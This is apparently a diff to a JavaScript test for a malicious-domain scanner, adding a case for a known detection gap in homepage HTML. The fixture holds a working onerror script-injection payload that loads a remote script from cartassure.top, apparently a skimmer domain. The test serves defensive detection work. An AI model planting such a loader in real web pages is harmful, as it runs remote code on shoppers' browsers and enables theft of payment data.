@@ -347,6 +347,13 @@ describe("maliciousDomainsInUrls (speed test requests)", () => {
         "https://cartassure.top/check-out/assets/l3.js",
       ]),
     ).toEqual(["cartassure.top"]);
+    // Known gap, closed by gc-7gjj sub-bead D: the same loader in the static
+    // homepage HTML is not read. Flip this when on*= attributes are scanned.
+    const menuLabel = page(
+      "",
+      "<a href=\"/collections/all\">Shop<img src=x onerror=\"s=document.createElement('script');s.src='https://cartassure.top/check-out/assets/l2.js';document.head.appendChild(s)\"></a>",
+    );
+    expect(findMaliciousInHomepage(menuLabel, [])).toEqual([]);
   });
 
   it("skips lookalikes, non-http URLs, non-strings and garbage", () => {
